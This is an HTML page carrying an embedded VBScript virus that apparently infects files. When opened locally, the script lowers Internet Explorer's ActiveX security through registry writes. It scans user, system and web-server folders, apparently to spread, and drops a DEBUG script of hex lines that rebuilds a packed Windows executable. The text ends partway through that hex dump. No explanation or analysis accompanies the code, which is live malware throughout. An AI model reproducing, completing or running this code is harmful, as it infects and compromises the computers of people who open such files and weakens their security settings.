<!--[H4-->
<Html><body>
<script Language="VBScript"><!--
On Error Resume Next
if location.protocol = "file:" then
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
 WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
  if location.protocol = "file:" then
	Set FSO = CreateObject("Scripting.FileSystemObject")
	HPath = Replace(location.href, "/", "\")
	HPath = Replace(HPath, "file:\\\", "")
	HPath = FSO.GetParentFolderName(HPath)
	Set TRange = document.body.createTextRange
	Call GetFolder(HPath)
	Call GetFolder("C:\My Documents")
	Call GetFolder("C:\Windows\Desktop")
	Call GetFolder("C:\Windows\Web")
	Call GetFolder("C:\Mis Documentos")
	Call GetFolder("C:\Windows\Help")
	Call GetFolder("C:\Windows\Escritorio")
        Call GetFolder("C:\Win2000\Web")
        Call GetFolder("C:\Win2000\Help")
	Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
	Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
	Call GetFolder("C:\Inetpub\wwwroot")
	Set ScrFile = FSO.CreateTextFile("C:\[H4[H04.DLL", 2, False)
	ScrFile.WriteLine ""
	ScrFile.WriteLine "N [H4[H04.EXE"
        ScrFile.WriteLine "E 0100 4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00" 
	ScrFile.WriteLine "E 0110 B8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00" 
	ScrFile.WriteLine "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00" 
	ScrFile.WriteLine "E 0140 BA 10 00 0E 1F B4 09 CD 21 B8 01 4C CD 21 90 90" 
	ScrFile.WriteLine "E 0150 54 68 69 73 20 70 72 6F 67 72 61 6D 20 6D 75 73" 
	ScrFile.WriteLine "E 0160 74 20 62 65 20 72 75 6E 20 75 6E 64 65 72 20 57" 
	ScrFile.WriteLine "E 0170 69 6E 33 32 0D 0A 24 37 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0200 50 45 00 00 4C 01 03 00 00 00 71 64 90 90 90 90" 
	ScrFile.WriteLine "E 0210 00 00 00 00 E0 00 8F 81 0B 01 02 19 00 16 00 00" 
	ScrFile.WriteLine "E 0220 00 06 00 00 00 00 00 00 32 40 00 00 00 10 00 00" 
	ScrFile.WriteLine "E 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00" 
	ScrFile.WriteLine "E 0240 01 00 00 00 00 00 00 00 03 00 0A 00 00 00 00 00" 
	ScrFile.WriteLine "E 0250 00 80 00 00 00 04 00 00 27 B6 00 00 02 00 00 00" 
	ScrFile.WriteLine "E 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00" 
	ScrFile.WriteLine "E 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0280 BF 41 00 00 73 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 02F0 00 00 00 00 00 00 00 00 70 65 63 31 00 00 00 00" 
	ScrFile.WriteLine "E 0300 00 20 00 00 00 10 00 00 00 06 00 00 00 04 00 00" 
	ScrFile.WriteLine "E 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 E0" 
	ScrFile.WriteLine "E 0320 70 65 63 32 00 00 00 00 00 10 00 00 00 30 00 00" 
	ScrFile.WriteLine "E 0330 00 02 00 00 00 0A 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0340 00 00 00 00 40 00 00 C0 70 65 63 33 00 00 00 00" 
	ScrFile.WriteLine "E 0350 8A 3F 00 00 00 40 00 00 00 04 00 00 00 0C 00 00" 
	ScrFile.WriteLine "E 0360 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 E0" 
	ScrFile.WriteLine "E 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 03C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 03D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 03E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 03F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 04C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 04D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 04E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 04F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0500 67 AA 1E 2C 01 88 AE 03 FD E0 8E B0 16 DD 41 5A" 
	ScrFile.WriteLine "E 0510 3D A6 48 EF AC 4A 16 D7 16 1C 81 E7 25 01 47 C2" 
	ScrFile.WriteLine "E 0520 67 61 72 10 4E 1C 9E A0 AF 2F 42 AE A9 10 20 B0" 
	ScrFile.WriteLine "E 0530 26 C0 B7 1F AD 90 26 D2 1A 84 0E 60 41 41 02 AA" 
	ScrFile.WriteLine "E 0540 68 03 83 A2 DA A6 1B 6B C9 BC 87 03 7C C0 1F 78" 
	ScrFile.WriteLine "E 0550 45 D9 5D C8 57 F4 05 4D 3D C3 81 72 F3 7A A6 5B" 
	ScrFile.WriteLine "E 0560 31 18 3C 7D E9 0F E1 85 4C 17 C3 4D 72 0F 7A 94" 
	ScrFile.WriteLine "E 0570 6C F0 16 4F 77 01 F9 7F 61 02 8C C8 C8 DA CF CC" 
	ScrFile.WriteLine "E 0580 62 A4 53 3C D0 BE 2D 4C 8D 78 FD F0 52 1D B9 1B" 
	ScrFile.WriteLine "E 0590 93 B4 CF FE C5 43 11 FC 60 96 8B 98 AB FE BE B8" 
	ScrFile.WriteLine "E 05A0 B4 2C 40 54 63 8E 17 73 E1 68 C4 0C 24 D7 3D 80" 
	ScrFile.WriteLine "E 05B0 92 10 8B 77 07 B2 7A 84 6D 62 07 7B CC FF 83 7F" 
	ScrFile.WriteLine "E 05C0 83 28 16 26 9F 69 7A 02 28 47 6E 00 5C 54 E2 04" 
	ScrFile.WriteLine "E 05D0 75 9B 8E 9C DE C1 03 23 CC 05 75 B1 E4 89 B1 0F" 
	ScrFile.WriteLine "E 05E0 9D 80 2E D4 81 B2 BB 35 14 C1 73 09 04 86 0C F8" 
	ScrFile.WriteLine "E 05F0 FA D6 81 3E B6 4A 87 44 48 7B F6 7C 4C 8B CC 99" 
	ScrFile.WriteLine "E 0600 17 AB 46 58 F3 07 13 4B A7 52 21 5D 68 87 AC 01" 
	ScrFile.WriteLine "E 0610 ED F5 3B 3D 65 76 72 2A 1F 08 25 40 31 2E 07 49" 
	ScrFile.WriteLine "E 0620 C5 3C FC 08 31 58 59 BB 14 9C 5A 95 F5 A1 9E 9F" 
	ScrFile.WriteLine "E 0630 C3 9A 8D 75 89 99 98 21 B7 17 53 9A A4 8D DA 70" 
	ScrFile.WriteLine "E 0640 41 63 C3 EC C9 CC 27 06 88 6B 28 51 73 F1 65 F2" 
	ScrFile.WriteLine "E 0650 84 62 42 56 67 EF 7E 84 53 AD E5 FF 5C 58 6A FE" 
	ScrFile.WriteLine "E 0660 3E F2 3E 3D 15 B2 BA C0 E7 FE 60 10 A2 7E 6A 89" 
	ScrFile.WriteLine "E 0670 9B 6C 04 77 4A 6C C4 AC 15 43 3F 10 14 99 45 02" 
	ScrFile.WriteLine "E 0680 8C A8 A5 16 8B 20 CA 90 0D 01 74 F4 44 60 52 2E" 
	ScrFile.WriteLine "E 0690 84 09 82 3B 65 84 D8 14 A0 A0 33 E5 59 E0 E1 31" 
	ScrFile.WriteLine "E 06A0 16 2B EF 1C AC 0D 2C 8C 10 B2 2A 48 3A 04 D1 5E" 
	ScrFile.WriteLine "E 06B0 62 B0 4C A1 38 2A 85 BF 1F 02 BF 84 92 15 9D 79" 
	ScrFile.WriteLine "E 06C0 13 AC 5F DC F8 CF 8C D2 8C 1E D1 0B 25 DC D9 F3" 
	ScrFile.WriteLine "E 06D0 16 75 06 B0 12 E9 D4 21 85 3A 34 30 87 2C C3 54" 
	ScrFile.WriteLine "E 06E0 A1 D4 59 F8 33 89 4A 6A B1 B0 F8 3D 60 0E 24 24" 
	ScrFile.WriteLine "E 06F0 C9 84 3F 49 02 D5 5C 57 74 25 8D 82 24 0E 66 ED" 
	ScrFile.WriteLine "E 0700 00 54 A0 5A 22 64 D0 D0 00 D7 D8 9B BE 09 0B 27" 
	ScrFile.WriteLine "E 0710 82 F1 B3 33 5B 79 2D B1 18 44 5C 99 9C 09 81 F6" 
	ScrFile.WriteLine "E 0720 21 2F FC 50 28 17 B5 95 9C 09 75 24 1F 0C 10 A2" 
	ScrFile.WriteLine "E 0730 91 C0 B4 43 16 12 35 A0 36 04 40 D5 FA AC 1B 03" 
	ScrFile.WriteLine "E 0740 89 93 2A A0 09 B8 34 DD 65 89 9D C8 07 9B 8C 7B" 
	ScrFile.WriteLine "E 0750 6C 1A 30 16 E2 8B 73 EE 5C C0 47 6F 8A 40 6B 9C" 
	ScrFile.WriteLine "E 0760 0D E1 57 B5 27 0B 83 55 2D 8C 8C B9 81 AA B2 12" 
	ScrFile.WriteLine "E 0770 3F 91 0E B5 02 2D 55 28 0A B6 F2 A2 51 02 64 51" 
	ScrFile.WriteLine "E 0780 03 63 82 7B 03 53 8A 91 19 29 D5 22 72 89 C1 DD" 
	ScrFile.WriteLine "E 0790 9C 46 3A 35 DB 06 E0 D0 61 D6 A9 B6 67 45 E1 EF" 
	ScrFile.WriteLine "E 07A0 8B 0D C5 A9 F7 0E 31 0A 86 8D A0 45 1A 7C A2 87" 
	ScrFile.WriteLine "E 07B0 D6 CE B5 29 28 82 54 76 7D F1 87 E2 B4 E8 3A 92" 
	ScrFile.WriteLine "E 07C0 AA D8 32 34 0A 06 DD 20 01 A7 7A C3 28 87 5C 22" 
	ScrFile.WriteLine "E 07D0 90 65 34 6A 95 50 26 FA 4A AD 42 84 A7 0A 1E 1C" 
	ScrFile.WriteLine "E 07E0 15 96 6C 8C 20 49 92 CB 41 88 9C 1E AD 0E F9 11" 
	ScrFile.WriteLine "E 07F0 0E 4D 05 A1 C3 BA C1 16 D3 06 EC 08 8F EF FB 72" 
	ScrFile.WriteLine "E 0800 28 14 92 40 81 55 49 A7 04 24 C1 83 DE 8D 89 DD" 
	ScrFile.WriteLine "E 0810 83 DD C8 D1 78 35 2C 9A 06 B7 09 22 FA 8B 79 EE" 
	ScrFile.WriteLine "E 0820 57 E5 F3 F9 B9 D2 98 88 7C 3F 63 12 F1 07 6C 7E" 
	ScrFile.WriteLine "E 0830 BE 38 E6 B8 3D 66 E2 1E 58 A7 BC 0B AD 21 63 45" 
	ScrFile.WriteLine "E 0840 AD 72 83 5C 4C 7B 40 1C 00 AA FB 3F 24 55 B9 A0" 
	ScrFile.WriteLine "E 0850 A1 5B 99 53 B1 F4 B9 77 DC E7 2C 04 C8 30 AF 9C" 
	ScrFile.WriteLine "E 0860 6A F5 95 80 EC 7A AB 18 CA EB 3E BD EF EB D0 E3" 
	ScrFile.WriteLine "E 0870 13 D4 25 43 63 73 B9 B2 C5 59 C4 F4 43 E5 5E A9" 
	ScrFile.WriteLine "E 0880 CA A8 6C 19 B1 5A 8C 2C 2C 0D 58 2B 7F 56 33 C5" 
	ScrFile.WriteLine "E 0890 6B C0 26 12 13 13 14 FD 8E 00 18 D5 E1 74 A1 D4" 
	ScrFile.WriteLine "E 08A0 1A F3 D4 D2 F6 66 78 BC 22 F7 7D CD AE 46 B0 4D" 
	ScrFile.WriteLine "E 08B0 DE 04 32 B3 6B E0 BF AE 17 DF A3 C0 8F 5A 16 50" 
	ScrFile.WriteLine "E 08C0 DA AF 49 80 66 CD 9F 91 8D 8A 86 4D F0 72 A3 CB" 
	ScrFile.WriteLine "E 08D0 AD 0C B4 52 2A 5E 48 D3 30 91 30 BE DC C4 DF 47" 
	ScrFile.WriteLine "E 08E0 DB E2 06 F4 1B 80 2F C2 C0 83 7A 84 67 22 82 55" 
	ScrFile.WriteLine "E 08F0 5A 08 0D 34 79 12 B9 61 81 41 AE DE 29 F0 83 64" 
	ScrFile.WriteLine "E 0900 2A 87 01 97 51 80 B7 EC 85 4A DF CA A0 63 00 D9" 
	ScrFile.WriteLine "E 0910 13 05 00 73 E5 C1 EA 0E 8B 24 83 5B 2D 51 32 24" 
	ScrFile.WriteLine "E 0920 16 C6 12 DE 41 F3 54 80 55 D8 AA 70 C6 D5 AC DB" 
	ScrFile.WriteLine "E 0930 EE 82 34 F7 A6 D2 E6 1A 2D 0C 85 B5 A3 16 D2 14" 
	ScrFile.WriteLine "E 0940 24 10 10 96 65 AB 83 95 9C D2 F0 1E CB C1 C4 50" 
	ScrFile.WriteLine "E 0950 EE 5B 98 62 61 EC 28 38 90 0B 15 6B C3 D4 D9 5C" 
	ScrFile.WriteLine "E 0960 61 E2 28 3F BA 66 44 C2 F1 98 E2 18 0E A4 41 30" 
	ScrFile.WriteLine "E 0970 FB D8 80 AA A0 ED DF D8 32 18 86 61 83 A9 27 BD" 
	ScrFile.WriteLine "E 0980 2D 54 A0 E7 5C C3 54 87 A5 8C 84 91 15 01 78 73" 
	ScrFile.WriteLine "E 0990 68 CA 88 26 85 08 F6 32 5A 17 BE 6D 75 C9 CC 14" 
	ScrFile.WriteLine "E 09A0 48 4C 02 80 D6 2D 6D 99 15 D8 5D 4A B0 44 0F D5" 
	ScrFile.WriteLine "E 09B0 A2 D5 6C D7 73 15 C1 0E 01 8F 56 17 A6 4E D8 D4" 
	ScrFile.WriteLine "E 09C0 83 2F 08 DC 06 C5 50 ED 17 22 21 20 21 E9 41 E8" 
	ScrFile.WriteLine "E 09D0 D7 E9 D3 4A 16 46 08 DB D6 D0 45 3B 8A 2D 0C 06" 
	ScrFile.WriteLine "E 09E0 29 E6 A9 C6 40 0D 1D 3B 9C 86 B3 CB 02 4A 44 66" 
	ScrFile.WriteLine "E 09F0 98 4A 9A 00 2A 13 FA B1 71 60 8A B3 6A 38 8A A5" 
	ScrFile.WriteLine "E 0A00 C4 E6 05 43 15 80 F8 AE D5 9F 61 6A 85 6A D1 8A" 
	ScrFile.WriteLine "E 0A10 1A 6E 86 1A C8 0A 88 22 85 16 05 59 0C 48 97 36" 
	ScrFile.WriteLine "E 0A20 0B 79 A7 49 A9 02 2C DC 92 36 2F 19 47 03 5D B9" 
	ScrFile.WriteLine "E 0A30 94 44 C5 02 03 6C B0 6B B9 89 08 DD C8 B4 02 11" 
	ScrFile.WriteLine "E 0A40 30 80 EA 0E 9F EB 2C F9 80 C2 2A 00 EA 6E 00 10" 
	ScrFile.WriteLine "E 0A50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0A70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0A80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0A90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0AA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0AB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0AC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0AD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0AE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B00 27 80 B1 FF 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0BC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0BD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0BE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0BF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0C90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0CA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0CB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0CC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0CD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0CE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0CF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0D00 50 94 09 20 82 D3 30 33 05 61 05 98 35 CA 82 01" 
	ScrFile.WriteLine "E 0D10 A5 34 6A D1 E0 54 C9 54 CA 9C 64 5D 00 B6 00 61" 
	ScrFile.WriteLine "E 0D20 E2 5D 74 D3 5C A8 F6 AD 2D 3B 00 CC 01 B6 DC DD" 
	ScrFile.WriteLine "E 0D30 00 20 EB 06 68 00 10 00 00 C3 9C 60 E8 00 00 00" 
	ScrFile.WriteLine "E 0D40 00 5D 55 5B 81 ED 7F 6E 40 00 8B 85 DF 6F 40 00" 
	ScrFile.WriteLine "E 0D50 01 85 73 6E 40 00 66 C7 85 70 6E 40 00 90 90 BB" 
	ScrFile.WriteLine "E 0D60 2E 05 00 00 03 9D E3 6F 40 00 03 9D DF 6F 40 00" 
	ScrFile.WriteLine "E 0D70 53 58 50 50 2D D0 6E 40 00 89 85 D1 6E 40 00 5F" 
	ScrFile.WriteLine "E 0D80 8D B5 D0 6E 40 00 B9 34 01 00 00 F3 A5 5F 57 5A" 
	ScrFile.WriteLine "E 0D90 FF E2 BD 00 00 00 00 57 5E 81 C6 A0 01 00 00 81" 
	ScrFile.WriteLine "E 0DA0 C7 CE 04 00 00 57 56 57 55 57 56 E8 0B 00 00 00" 
	ScrFile.WriteLine "E 0DB0 5D 91 5E 5F F3 A4 E9 77 01 00 00 C8 00 00 00 8B" 
	ScrFile.WriteLine "E 0DC0 75 08 8B 7D 0C FC 66 BA 00 80 33 DB 43 33 C0 E8" 
	ScrFile.WriteLine "E 0DD0 8A 00 00 00 73 08 E8 91 00 00 00 AA EB EF E8 7B" 
	ScrFile.WriteLine "E 0DE0 00 00 00 72 27 E8 74 00 00 00 72 0E B9 04 00 00" 
	ScrFile.WriteLine "E 0DF0 00 E8 7B 00 00 00 40 41 EB 57 E8 6D 00 00 00 D1" 
	ScrFile.WriteLine "E 0E00 E8 0F 84 89 00 00 00 83 D1 02 EB 45 E8 6D 00 00" 
	ScrFile.WriteLine "E 0E10 00 49 49 75 04 8B C3 EB 14 49 51 B9 08 00 00 00" 
	ScrFile.WriteLine "E 0E20 E8 4C 00 00 00 59 C1 E1 08 0B C1 8B D8 E8 4C 00" 
	ScrFile.WriteLine "E 0E30 00 00 3D FF 57 00 00 73 15 3D 00 2C 00 00 73 0F" 
	ScrFile.WriteLine "E 0E40 3D FF 00 00 00 73 09 83 F8 7F 77 05 EB 01 41 41" 
	ScrFile.WriteLine "E 0E50 41 56 8B F7 2B F0 F3 A4 5E E9 6F FF FF FF 66 03" 
	ScrFile.WriteLine "E 0E60 D2 75 08 66 8B 16 46 46 66 13 D2 C3 B9 08 00 00" 
	ScrFile.WriteLine "E 0E70 00 33 C0 E8 E6 FF FF FF 13 C0 49 75 F6 C3 33 C9" 
	ScrFile.WriteLine "E 0E80 41 E8 D8 FF FF FF 13 C9 E8 D1 FF FF FF 72 F2 C3" 
	ScrFile.WriteLine "E 0E90 8B C7 2B 45 0C C9 C2 08 00 5C 2A 00 00 41 40 00" 
	ScrFile.WriteLine "E 0EA0 00 00 00 40 00 00 50 00 00 00 00 00 00 0C 00 00" 
	ScrFile.WriteLine "E 0EB0 00 00 30 00 00 00 00 00 00 08 00 00 00 00 00 E7" 
	ScrFile.WriteLine "E 0EC0 41 00 00 00 00 00 00 00 00 00 00 F7 41 00 00 E7" 
	ScrFile.WriteLine "E 0ED0 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 0EE0 00 00 00 00 00 00 00 04 42 00 00 13 42 00 00 24" 
	ScrFile.WriteLine "E 0EF0 42 00 00 00 00 00 00 4B 45 52 4E 45 4C 33 32 2E" 
	ScrFile.WriteLine "E 0F00 44 4C 4C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72" 
	ScrFile.WriteLine "E 0F10 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72" 
	ScrFile.WriteLine "E 0F20 65 73 73 00 00 00 45 78 69 74 50 72 6F 63 65 73" 
	ScrFile.WriteLine "E 0F30 73 00 E3 AF BA 76 95 6B 01 02 C2 8B ED F7 32 E4" 
	ScrFile.WriteLine "E 0F40 16 02 71 BF 63 60 49 44 B5 6A B6 7A 17 B6 BA C0" 
	ScrFile.WriteLine "E 0F50 B2 4F 3C 50 0D AB F2 82 7A 35 4A 8D F3 BD 56 D2" 
	ScrFile.WriteLine "E 0F60 F3 6B AB BC 97 0F B1 58 CF 66 1B 11 5E 05 52 BD" 
	ScrFile.WriteLine "E 0F70 D4 AF 24 2B C3 CA FC 03 E8 01 F9 4A 2A 03 89 FE" 
	ScrFile.WriteLine "E 0F80 FB 97 02 FE 5F BD E0 AE D0 F8 5E 8F 27 E8 18 12" 
	ScrFile.WriteLine "E 0F90 BF 70 45 C5 09 93 0D FC AC 99 B6 98 4C 08 A9 91" 
	ScrFile.WriteLine "E 0FA0 61 AB C6 FB D6 C0 B1 D7 A2 7F 10 18 4C 91 01 F8" 
	ScrFile.WriteLine "E 0FB0 42 B5 DF AF 1E 08 88 F5 14 41 A0 EF 6B 8C 92 04" 
	ScrFile.WriteLine "E 0FC0 79 BE AF 2C F7 FA 8E 9E 92 68 12 04 42 7C 73 EE" 
	ScrFile.WriteLine "E 0FD0 6E 4C EE 76 6A 6B FC 7F 96 AC 43 E0 CC 8D 91 74" 
	ScrFile.WriteLine "E 0FE0 98 60 A8 44 49 12 25 49 96 23 3B 12 98 6A 24 01" 
	ScrFile.WriteLine "E 0FF0 1B 84 D0 FF A5 03 92 96 0E BB D0 76 20 0E B8 5E" 
	ScrFile.WriteLine "E 1000 BD 78 48 AE C2 9D D7 FE C0 48 DC 96 1F 68 D1 CB" 
	ScrFile.WriteLine "E 1010 35 0F 28 77 59 5B 40 91 E8 57 6E 63 0F 1F 0F C7" 
	ScrFile.WriteLine "E 1020 53 F2 CD 21 44 12 7C 21 90 91 BD 2A 07 66 03 CA" 
	ScrFile.WriteLine "E 1030 19 FA 86 46 FA 1C 8E 50 46 15 50 A5 64 67 56 AD" 
	ScrFile.WriteLine "E 1040 1C 49 13 EF C7 85 81 28 45 46 C5 F6 7E CB 33 FC" 
	ScrFile.WriteLine "E 1050 80 1F C1 BA 7D 20 18 AA 0F 0C FE 8F AF 40 69 E5" 
	ScrFile.WriteLine "E 1060 CD A8 10 AB 2F 8D 67 8C 35 42 3E 78 13 0C CD D7" 
	ScrFile.WriteLine "E 1070 41 66 7D 80 A5 5A B8 65 6D DD 20 37 49 96 12 05" 
	ScrFile.WriteLine "E 1080 00 98 B4 1D CC 4D 2B 00 9E 75 00 43 D4 AA B5 E8" 
	ScrFile.WriteLine "E 1090 9C 29 5C CA 45 4A 6C 53 A2 A4 67 C3 42 09 DE B7" 
	ScrFile.WriteLine "E 10A0 22 28 A0 D2 2B 30 00 54 0B B0 3F 70 23 EA A0 C3" 
	ScrFile.WriteLine "E 10B0 5E A4 41 60 CC A0 D3 3E 2C 20 EA 03 00 A1 00 00" 
